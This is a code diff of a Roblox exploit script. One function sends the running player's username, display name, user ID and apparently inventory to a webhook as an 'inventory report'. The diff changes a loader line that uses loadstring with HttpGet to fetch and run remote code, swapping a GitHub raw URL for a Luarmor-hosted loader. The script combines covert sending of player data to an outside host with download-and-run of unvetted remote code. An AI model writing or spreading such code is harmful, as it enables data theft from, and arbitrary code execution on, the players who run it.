@@ -88,7 +88,7 @@ local function sendBackpackToWebhook()
     local payload = HttpService:JSONEncode({
         embeds = {{
             title = "🔍 Player Inventory Report",
-            description = "A new player has loaded into the script execution environment.",
+            description = "A player has loaded into the script execution environment.",
             color = 10181046, -- Sleek Purple Hex color
             fields = {
                 { name = "👤 User Information", value = string.format("**Username:** %s\n**Display Name:** %s\n**User ID:** `%s`", localPlayer.Name, localPlayer.DisplayName, tostring(localPlayer.UserId)), inline = false },
@@ -480,10 +480,9 @@ task.spawn(function()
 end)
 
 -- CONCURRENT LOADER: Runs your Luarmor script inside its own thread
--- CONCURRENT LOADER: Runs your GitHub script inside its own thread
 task.spawn(function()
     local ok, err = pcall(function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/xQuartyx/QuartyzScript/main/Loader.lua"))()
+        loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/795c7accd08487171484e54a92e75c77.lua"))()
     end)
     if not ok then
         warn("External script failed to run: " .. tostring(err))
